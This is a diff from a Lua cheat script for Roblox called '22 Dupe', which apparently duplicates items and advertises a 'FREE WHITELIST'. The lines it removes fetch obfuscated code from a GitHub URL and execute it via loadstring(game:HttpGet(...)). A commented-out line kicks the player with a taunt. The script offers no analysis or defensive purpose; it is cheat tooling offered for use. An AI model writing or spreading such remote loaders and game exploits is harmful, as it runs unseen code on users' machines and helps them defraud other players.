@@ -41,30 +41,8 @@ else
       notifSound.PlayOnRemove = true
       notifSound:Destroy()
 game.StarterGui:SetCore("SendNotification", {Title = "22 Dupe", Text = "Type /e Drop <Amt> for AutoDrop", Icon = "rbxassetid://505845268", Duration = 60, Button1 = "Gocha!"})
-game.StarterGui:SetCore("SendNotification", {Title = "22 Dupe", Text = "FOOREE WHITELIST                                    By kristina#1111", Icon = "rbxassetid://505845268", Duration = 10, Button1 = "Okay"})
-wait(3)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/22kyasue/22dupes/master/source_obfuscated", true))()
-wait(7)
-local StarterGui = game:GetService("StarterGui")
+game.StarterGui:SetCore("SendNotification", {Title = "22 Dupe", Text = "FREE WHITELIST                                    By kristina#1111", Icon = "rbxassetid://505845268", Duration = 60, Button1 = "Okay"})
 
-local Notifications = {
-	"FREE WHITELIST (7 Days Remaining)",
-	"FREE WHITELIST (7 Days Remaining)",
-}
-
-local TimeBetweenNotifications = 10 --REPLACE 5 WITH THE NUMBER OF SECONDS YOU WANT TO WAIT IN BETWEEN NOTIFICATIONS APPEARING
-while true do
-	for i = 1, #Notifications do
-		local Notification = Notifications[i]
-		
-		StarterGui:SetCore("SendNotification", {
-			Title = "22 Dupe",
-			Text = Notification,
-		})
-		
-		wait(TimeBetweenNotifications)
-	end
-end
 --game:service('Players').LocalPlayer:Kick('Ez ez, dm kristina#1111')
 
 end
